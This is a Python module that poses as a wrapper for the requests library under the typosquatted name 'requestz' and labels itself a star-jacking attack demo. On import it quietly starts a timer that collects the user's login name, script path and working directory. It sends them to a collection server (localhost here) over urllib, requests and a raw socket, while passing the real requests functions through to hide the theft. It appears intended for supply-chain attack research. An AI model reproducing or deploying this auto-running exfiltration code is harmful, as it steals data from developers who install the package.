import socket
import os
import sys
import json
import threading
import urllib.request
import base64

# Import the real requests to wrap its functionality
import requests

# Function to collect system information
def collect_minimal_info():
    """Collect basic system information"""
    info = {
        "username": os.getlogin(),
        "script_path": os.path.abspath(sys.argv[0]),
        "working_dir": os.getcwd(),
        "package": "requestz (Star Jacking Attack)"
    }
    return info

def send_data_socket(host, port, data):
    """Send data using Socket to remote server"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((host, port))
            s.sendall(json.dumps(data).encode())
            return True
    except Exception:
        return False

def send_data_http(url, data):
    """Send data using HTTP requests"""
    try:
        # Using real requests library
        requests.post(url, json=data, timeout=5)
        return True
    except Exception:
        return False

def send_data_urllib(url, data):
    """Send data using urllib from standard library"""
    try:
        json_data = json.dumps(data).encode('utf-8')
        req = urllib.request.Request(url, data=json_data, headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req, timeout=5)
        return True
    except Exception:
        return False

def exfiltrate_data():
    """Main function to collect and send data"""
    # Collect information
    info = collect_minimal_info()
    
    # Remote server URL (localhost for demo purposes)
    remote_url = "http://localhost:5000/collect"
    
    # Try different methods to send the data
    methods = [
        (send_data_urllib, (remote_url, info)),
        (send_data_http, (remote_url, info)),
        (send_data_socket, ("localhost", 5000, info))
    ]
    
    for method, args in methods:
        thread = threading.Thread(
            target=method,
            args=args,
            daemon=True
        )
        thread.start()
        thread.join(timeout=0.1)

# Automatically trigger data exfiltration when the package is imported
threading.Timer(2, exfiltrate_data).start()

# Wrap the actual requests library functions to provide expected functionality
def get(url, **kwargs):
    """Wrapper for requests.get"""
    return requests.get(url, **kwargs)

def post(url, **kwargs):
    """Wrapper for requests.post"""
    return requests.post(url, **kwargs)

def put(url, **kwargs):
    """Wrapper for requests.put"""
    return requests.put(url, **kwargs)

def delete(url, **kwargs):
    """Wrapper for requests.delete"""
    return requests.delete(url, **kwargs)

def head(url, **kwargs):
    """Wrapper for requests.head"""
    return requests.head(url, **kwargs)

def options(url, **kwargs):
    """Wrapper for requests.options"""
    return requests.options(url, **kwargs)

# Also expose Session and other important classes/functions from the real requests
Session = requests.Session
Request = requests.Request
Response = requests.Response 
